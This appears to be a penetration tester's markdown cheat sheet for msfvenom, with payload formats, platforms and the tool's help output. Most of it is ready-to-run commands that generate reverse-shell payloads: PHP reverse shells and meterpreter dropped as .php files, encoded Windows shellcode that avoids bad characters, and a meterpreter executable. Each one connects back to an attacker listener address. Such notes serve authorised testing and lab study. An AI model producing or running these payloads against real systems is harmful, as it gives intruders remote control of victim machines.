## MSFvenom
------------
https://www.offensive-security.com/metasploit-unleashed/Msfvenom/

https://www.offensive-security.com/metasploit-unleashed/Msfvenom/
https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

- Generates shellcode

+ So if I have a PHP webserver on Linux and want to create a reverse shell:
`# msfvenom -f raw -p php/reverse_php lhost=192.168.56.103 lport=443 > shell2.php`
`# msfpayload -p php/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=443 > shell3.php`

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

Payloads:  
```
root@kali:~# msfvenom -l payloads
```

The Flags:
- format flag, what is the output supposed to look like?
  ```
  # msfvenom --help-formats
  Executable formats
  asp, aspx, aspx-exe, dll, elf, elf-so, exe, exe-only, exe-service, exe-small,
  hta-psh, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-net, psh-reflection,
  psh-cmd, vba, vba-exe, vba-psh, vbs, war
  Transform formats
  bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl,
  powershell, ps1, py, python, raw, rb, ruby, sh,
  vbapplication, vbscript
  ```


–platform
  Cisco or cisco
  OSX or osx
  Solaris or solaris
  BSD or bsd
  OpenBSD or openbsd
  Firefox or firefox
  BSDi or bsdi
  NetBSD or netbsd
  NodeJS or nodejs
  FreeBSD or freebsd
  Python or python
  AIX or aix
  JavaScript or javascript
  HPUX or hpux
  PHP or php
  Irix or irix
  Unix or unix
  Linux or linux
  Ruby or ruby
  Java or java
  Android or android
  Netware or netware
  Windows or windows

* Create executable for meterpreter session
```
# msfvenom -a x86 --platform Windows -p windows/meterpreter_reverse_tcp LHOST=10.0.0.11 LPORT=4444 -f exe > reverse.exe
```



* help
```
root@kali:~# msfvenom -h
Error: MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options]

Options:
    -p, --payload            Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled             Prepend a nopsled of [length] size on to the payload
    -f, --format              Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder            The encoder to use
    -a, --arch                  The architecture to use
        --platform          The platform of the payload
        --help-platforms             List available platforms
    -s, --space               The maximum size of the resulting payload
        --encoder-space       The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars             The list of characters to avoid example: '\x00\xff'
    -i, --iterations           The number of times to encode the payload
    -c, --add-code              Specify an additional win32 shellcode file to include
    -x, --template              Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out                   Save the payload
    -v, --var-name              Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
```
